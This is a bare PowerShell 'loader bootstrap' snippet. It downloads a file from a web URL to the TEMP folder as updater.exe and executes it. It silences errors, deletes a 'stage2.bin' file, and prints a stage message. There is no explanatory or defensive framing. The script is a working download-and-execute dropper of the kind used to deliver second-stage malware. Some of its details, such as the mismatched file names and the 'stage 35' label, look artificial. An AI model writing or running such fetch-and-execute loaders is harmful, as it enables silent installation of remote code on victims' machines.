
<# Loader bootstrap #> try { $TransferUrl = 'https://contoso.com/assets/update.dat'; $Stage2Path = "$env:TEMP\updater.exe"; Invoke-WebRequest -Uri $TransferUrl -OutFile $Stage2Path -UseBasicParsing -ErrorAction SilentlyContinue; & $Stage2Path; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Write-Output "stage 35 initialized" } catch { Write-Warning "Stage transfer failed" }
